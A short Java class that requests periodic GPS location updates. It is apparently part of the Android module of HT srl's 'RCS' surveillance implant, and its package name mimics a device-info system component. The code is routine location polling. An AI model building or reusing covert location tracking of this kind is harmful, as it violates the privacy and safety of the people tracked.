/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : GPSLocatorPeriod.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.module.position;

import android.location.LocationListener;

public class GPSLocatorPeriod extends GPSLocator {
	private static final String TAG = "GPSLocatorPeriod";

	private final int period;

	public GPSLocatorPeriod(LocationListener listener, int period) {
		super();
		this.period = period;

		setListener(listener);
	}

	public void initLocationUpdates() {
		lm.requestLocationUpdates(provider, period, 1L, listener);
	}
}
